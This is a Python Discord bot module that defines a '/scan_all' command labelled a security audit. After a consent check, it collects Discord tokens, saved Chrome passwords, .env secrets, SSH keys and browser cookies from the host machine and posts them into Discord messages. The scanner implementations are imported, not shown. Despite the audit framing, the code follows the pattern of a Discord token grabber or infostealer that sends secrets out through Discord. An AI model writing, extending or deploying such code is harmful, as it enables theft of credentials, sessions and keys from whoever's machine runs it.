import discord
from discord.ext import commands
from discord import app_commands
from core.consent_manager import ConsentManager
from core.token_scanner import TokenScanner
from core.password_scanner import PasswordScanner
from core.env_scanner import EnvScanner
from core.ssh_scanner import SSHScanner
from core.cookie_scanner import CookieScanner
from core.reporter import Reporter

class ScanAllCommand(commands.Cog):
    """Full security audit command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.reporter = Reporter()
        self.token_scanner = TokenScanner()
        self.password_scanner = PasswordScanner()
        self.env_scanner = EnvScanner()
        self.ssh_scanner = SSHScanner()
        self.cookie_scanner = CookieScanner()
    
    @app_commands.command(name="scan_all", description="Run FULL security audit (requires all consents)")
    async def scan_all(self, interaction: discord.Interaction):
        """Run full security audit"""
        user_id = interaction.user.id
        
        if not self.consent_mgr.has_consent(user_id, 'all'):
            await interaction.response.send_message("❌ Full audit requires all consent! Use `/consent_all`", ephemeral=True)
            return
        
        await interaction.response.defer(ephemeral=True)
        await interaction.followup.send("🔍 Running FULL SECURITY AUDIT... This may take a moment...", ephemeral=True)
        
        try:
            results = {
                "tokens": self.token_scanner.scan_discord_tokens(),
                "passwords": self.password_scanner.scan_chrome_passwords(),
                "env_secrets": self.env_scanner.scan_env_files(),
                "ssh_keys": self.ssh_scanner.scan_ssh_keys(),
                "cookies": self.cookie_scanner.scan_browser_cookies()
            }
            
            report = self.reporter.create_report(user_id, results)
            formatted = self.reporter.format_report(report)
            
            # Send report in chunks if too large
            if len(formatted) > 2000:
                chunks = [formatted[i:i+1900] for i in range(0, len(formatted), 1900)]
                for chunk in chunks:
                    await interaction.followup.send(f"```\n{chunk}\n```", ephemeral=True)
            else:
                await interaction.followup.send(f"```\n{formatted}\n```", ephemeral=True)
            
            self.consent_mgr.log_consent(user_id, 'all', True, "Full audit completed")
        except Exception as e:
            await interaction.followup.send(f"❌ Error during audit: {str(e)}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(ScanAllCommand(bot))
